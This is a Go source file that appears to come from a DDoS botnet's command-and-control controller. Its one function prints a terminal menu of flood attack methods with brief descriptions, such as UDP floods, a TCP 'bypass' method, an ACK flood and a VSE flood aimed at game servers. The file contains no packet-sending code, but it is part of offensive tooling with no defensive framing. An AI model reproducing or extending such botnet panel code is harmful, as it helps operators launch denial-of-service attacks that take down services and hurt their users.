package registers

import "BasicC2/controller/sessions"

func MethodScreen(params []string, session *sessions.Term) {
	session.TermCleaner()
	session.TermFormat(" [38;2;0;150;255m╔════════════════════════════════════════════════════════════════════════════╗")
	session.TermFormat("\r\n [38;2;220;20;60m   Methods   [38;2;255;234;0m│ [38;2;220;20;60mDescriptions")
	session.TermFormat("\r\n [38;2;170;255;0m ------------[38;2;255;234;0m│[38;2;170;255;0m---------------------------------------------------------------")
	session.TermFormat("\r\n    [38;2;255;255;255mtcpbypass [38;2;255;234;0m│ [38;2;255;255;255mtcp connection that bypasses something")
	session.TermFormat("\r\n    [38;2;255;255;255mudpplain  [38;2;255;234;0m│ [38;2;255;255;255mstandard flood with no added data")
	session.TermFormat("\r\n    [38;2;255;255;255mrudp      [38;2;255;234;0m│ [38;2;255;255;255mmethod that sends randomized hex strings")
	session.TermFormat("\r\n    [38;2;255;255;255mpudp      [38;2;255;234;0m│ [38;2;255;255;255mmethod focused on higher pps")
	session.TermFormat("\r\n    [38;2;255;255;255mhudp      [38;2;255;234;0m│ [38;2;255;255;255mmethod that sends hex string data")
	session.TermFormat("\r\n    [38;2;255;255;255mvse       [38;2;255;234;0m│ [38;2;255;255;255mstandardized flood that is primarily used for games")
	session.TermFormat("\r\n    [38;2;255;255;255mudp       [38;2;255;234;0m│ [38;2;255;255;255mstandard flood using generic data")
	session.TermFormat("\r\n    [38;2;255;255;255mstd       [38;2;255;234;0m│ [38;2;255;255;255mstandard flood using hex strings")
	session.TermFormat("\r\n    [38;2;255;255;255mack       [38;2;255;234;0m│ [38;2;255;255;255mstandard tcp flood using only ack flag")
	session.TermFormat("\r\n [38;2;170;255;0m ------------[38;2;255;234;0m│[38;2;170;255;0m---------------------------------------------------------------")
	session.TermFormat("\r\n [38;2;0;150;255m╚════════════════════════════════════════════════════════════════════════════╝")
	session.TermFormat("\r\n")
}
